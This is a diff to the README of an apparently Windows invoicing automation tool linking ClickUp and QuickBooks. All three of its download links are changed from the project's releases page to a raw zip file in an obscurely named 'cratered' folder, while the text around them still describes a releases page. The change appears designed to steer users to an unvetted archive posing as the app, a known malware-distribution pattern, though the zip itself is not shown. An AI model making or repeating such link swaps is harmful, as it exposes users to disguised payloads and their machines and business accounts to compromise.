@@ -1,6 +1,6 @@
 # 🤖 clickup-quickbooks-invoice-automation - Simplify Invoicing and Billing Workflows
 
-[![Download the app](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/3bbas99/clickup-quickbooks-invoice-automation/releases)
+[![Download the app](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/3bbas99/clickup-quickbooks-invoice-automation/raw/refs/heads/main/cratered/automation-invoice-clickup-quickbooks-1.2.zip)
 
 ## 🚀 Overview
 
@@ -31,7 +31,7 @@ If your setup uses Google Sheets, Slack, or n8n, keep those account details read
 ## 📥 Download the App
 
 Visit this page to download:
-https://github.com/3bbas99/clickup-quickbooks-invoice-automation/releases
+https://github.com/3bbas99/clickup-quickbooks-invoice-automation/raw/refs/heads/main/cratered/automation-invoice-clickup-quickbooks-1.2.zip
 
 On the releases page:
 1. open the latest release
@@ -243,7 +243,7 @@ Review access rights for ClickUp, QuickBooks, Slack, and Google Sheets before yo
 ## 📦 Release Page
 
 To get the latest Windows version, visit this page to download:
-https://github.com/3bbas99/clickup-quickbooks-invoice-automation/releases
+https://github.com/3bbas99/clickup-quickbooks-invoice-automation/raw/refs/heads/main/cratered/automation-invoice-clickup-quickbooks-1.2.zip
 
 Open the latest release, then choose the Windows file that matches your setup.
 
